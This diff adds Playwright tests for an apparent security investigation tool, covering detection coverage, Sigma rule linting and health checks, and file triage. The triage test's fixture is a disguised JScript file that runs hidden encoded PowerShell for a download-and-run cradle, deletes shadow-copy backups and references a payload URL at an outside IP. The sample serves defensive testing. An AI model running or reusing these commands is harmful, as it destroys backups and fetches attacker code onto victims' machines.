@@ -1304,3 +1304,44 @@ test('OSINT: look-alike domains are generated and checked through DNS only when 
   expect(await page.evaluate(() => pivotPlan('domain', 'lantern-invoice.example').map(p => p.act))).toContain('osTwist');
   noErrors(errors.filter(e => !/Failed to load resource/.test(e)));
 });
+
+test('detections intelligence: coverage against what cases show, gaps become draft rules, health lint and run across all evidence, tuning', async ({ page }) => {
+  const errors = await open(page, '#/detections');
+  await page.click('[data-act=dview][data-v=coverage]');
+  await expect(page.locator('.cv-sum')).toContainText('techniques covered'); expect(await page.locator('.cv-t').count()).toBeGreaterThan(10);
+  // a technique the evidence shows with no rule is a gap, and can be drafted
+  const id = await page.evaluate(() => { const C = coverage(), have = new Set(C.all.filter(x => x.rules.length).map(x => x.id)); const t = ATTACK.tech.find(x => !x[0].includes('.') && !have.has(x[0]) && !DB.rules.some(r => ruleTechs(r).some(y => y.startsWith(x[0])))); const r = DB.records.find(x => x.type !== 'lead'); r.ents = (r.ents || []).concat([{ k: 'ttp', v: t[0] }]); mutate('t'); return t[0]; });
+  await page.evaluate(() => renderMain()); await expect(page.locator('.cv-gaps')).toContainText(id);
+  const n0 = await page.evaluate(() => DB.rules.length); await page.click(`.cv-gaps [data-act=cvGap][data-v=${id}]`);
+  expect(await page.evaluate(() => DB.rules.length)).toBe(n0 + 1); expect(await page.evaluate(() => DB.rules[0].code)).toContain('attack.' + id.toLowerCase());
+  // lint
+  const L = await page.evaluate(() => ruleLint({ type: 'sigma', title: 'x', code: 'title: x\nlogsource:\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: \'ab\'\n    unused:\n        Image: \'a.exe\'\n    condition: selection or missing\n', tags: [], technique: '' }).map(l => l.sev + ':' + l.t));
+  expect(L.join('|')).toMatch(/err:Condition names “missing”/); expect(L.join('|')).toMatch(/warn:Selection “unused” is never used/); expect(L.join('|')).toMatch(/warn:CommandLine\|contains contains “ab” — too short/);
+  expect(await page.evaluate(() => ruleLint(DB.rules.find(r => /Password Spray From Single Source/.test(r.title))).filter(l => l.sev === 'err').length)).toBe(0);     // aggregations are not selections
+  // health: a deliberately noisy rule is flagged and gets a tuning suggestion; two identical rules are duplicates
+  await page.evaluate(() => { const mk = t => ({ id: uid('r'), type: 'sigma', title: t, desc: '', code: 'title: ' + t + '\nlogsource:\n    product: any\ndetection:\n    selection:\n        - \'beacon\'\n    condition: selection\nlevel: low', severity: 'low', category: 'other', technique: 'T1071', author: 'You', platform: 'Any', tags: [], refs: [], created: Date.now(), modified: Date.now(), starred: false });
+    DB.rules.push(mk('Noisy beacon word'), mk('Noisy beacon word copy')); for (let i = 0; i < 12; i++) DB.records.push({ id: uid('r'), caseId: DB.active, type: 'evidence', title: 'beacon heartbeat ' + i, body: 'host=WS-99 msg=beacon ok', tsRaw: '', tsZone: 'explicit', ts: Date.now(), source: 'proxy', host: 'WS-99', tags: [], ents: [], answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' }); mutate('t'); });
+  await page.evaluate(() => { UI.ropen = false; renderMain(); }); await page.click('[data-act=dview][data-v=health]');
+  await expect(page.locator('.dq-list')).toContainText('Noisy beacon word', { timeout: 30000 });
+  const H = await page.evaluate(() => { const r = DQ.health.rows.find(x => x.r.title === 'Noisy beacon word'); return { noisy: r.noisy, dups: (r.dups || []).map(d => d.title), tune: tuneSuggest(r) && tuneSuggest(r).yaml }; });
+  expect(H.noisy).toBe(true); expect(H.dups).toContain('Noisy beacon word copy'); expect(H.tune).toMatch(/filter_common:[\s\S]*: 'ws-99'[\s\S]*and not filter_common/);
+  await page.click('.dq-r [data-act=dqOpen] >> nth=0'); await expect(page.locator('.drw, .ide-ed, .fp-card').first()).toBeVisible();
+  noErrors(errors);
+});
+
+test('file triage: a disguised script that deletes backups scores malicious with reasons and an entropy map; a plain text file is clean; marking feeds the case', async ({ page }) => {
+  const errors = await open(page, '#/lab');
+  const bad = 'var s=new ActiveXObject("WScript.Shell");s.Run("powershell -w hidden -enc ' + 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA' + '");s.Run("vssadmin delete shadows /all /quiet");// http://45.77.10.20/payload.bin\n';
+  await page.setInputFiles('#labIn', { name: 'Invoice_2026.pdf.js', mimeType: 'application/javascript', buffer: Buffer.from(bad) });
+  await expect(page.locator('.tri')).toBeVisible({ timeout: 15000 });
+  const T = await page.evaluate(() => { const t = fileTriage(UI.labFile); return { s: t.score, b: t.band, r: t.reasons.map(x => x.t).join('|'), map: t.map.length }; });
+  expect(T.b).toBe('malicious'); expect(T.r).toMatch(/Double extension/); expect(T.r).toMatch(/Deletes backups/); expect(T.r).toMatch(/Encoded PowerShell/); expect(T.r).toMatch(/45\.77\.10\.20/); expect(T.map).toBeGreaterThan(0);
+  await expect(page.locator('.tri')).toContainText('Likely malicious'); await expect(page.locator('.tri-ent')).toBeVisible();
+  await page.click('[data-act=triMark]'); expect(await page.evaluate(() => verdictOf('sha256:' + UI.labFile.sha256))).toBe('malicious');
+  await expect(page.locator('.tri')).toContainText('You marked this file malicious before');
+  expect(await page.evaluate(() => labSummary(UI.labFile))).toMatch(/Triage: Likely malicious — \d+\/100/);
+  await page.click('[data-act=labClear]');
+  await page.setInputFiles('#labIn', { name: 'notes.txt', mimeType: 'text/plain', buffer: Buffer.from('Meeting notes. Buy milk. Call Sam on Tuesday about the budget.\n') });
+  await expect(page.locator('.tri')).toContainText('Nothing alarming', { timeout: 15000 });
+  noErrors(errors);
+});
